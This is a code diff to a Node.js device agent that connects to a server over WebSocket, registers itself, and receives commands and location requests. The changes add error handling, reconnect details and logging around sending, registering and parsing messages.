@@ -595,7 +595,13 @@ async function handleCommand(msg) {
   send({ type: 'commandResult', deviceId, commandId, commandType, result: JSON.stringify(result) });
 }
 
-function send(data) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(data)); }
+function send(data) {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    try { ws.send(JSON.stringify(data)); } catch(e) { log('error', 'Send failed:', e.message); }
+  } else {
+    log('warn', 'WS not open, queued:', data.type || 'unknown');
+  }
+}
 
 async function getSystemStats() {
     const stats = {
@@ -738,28 +744,33 @@ async function registerWithServer() {
 }
 
 function connect() {
+  log('info', `Connecting to ${WS_URL}...`);
   ws = new WebSocket(WS_URL);
   ws.on('open', async () => {
     reconnectAttempts = 0;
-    log('info', 'Forensic Tunnel Synchronized');
+    log('info', 'WebSocket connected — registering...');
     // Register in DB first to get pairCode
     await registerWithServer();
     // Then register via WebSocket with deviceType
-    send({ type: 'register', deviceId, deviceType: 'agent', hostname: os.hostname(), platform: os.platform() });
+    const regMsg = { type: 'register', deviceId, deviceType: 'agent', hostname: os.hostname(), platform: os.platform() };
+    log('info', `Registering as agent: deviceId=${deviceId}`);
+    send(regMsg);
     sendForensicHeartbeat().catch(e => log('error', 'Heartbeat failed:', e.message));
   });
   ws.on('message', (data) => {
     try {
       const msg = JSON.parse(data.toString());
+      log('info', `Received: ${msg.type} ${msg.commandType || ''}`);
       if (msg.type === 'command') handleCommand(msg);
       if (msg.type === 'locationRequest') sendForensicHeartbeat();
-    } catch (e) {}
+    } catch (e) { log('error', 'Parse error:', e.message); }
   });
-  ws.on('close', () => {
-      log('warn', 'WebSocket closed. Attempting reconnect...');
+  ws.on('close', (code, reason) => {
+      log('warn', `WebSocket closed (${code}). Reconnecting...`);
       setTimeout(connect, Math.min(RECONNECT_DELAY * ++reconnectAttempts, 30000));
   });
   ws.on('error', (e) => log('error', 'WS Error:', e.message));
+  ws.on('pong', () => {}); // keepalive response
 }
 
 // ─── HTTP POLLING FALLBACK ───────────────────────────────────────────────────
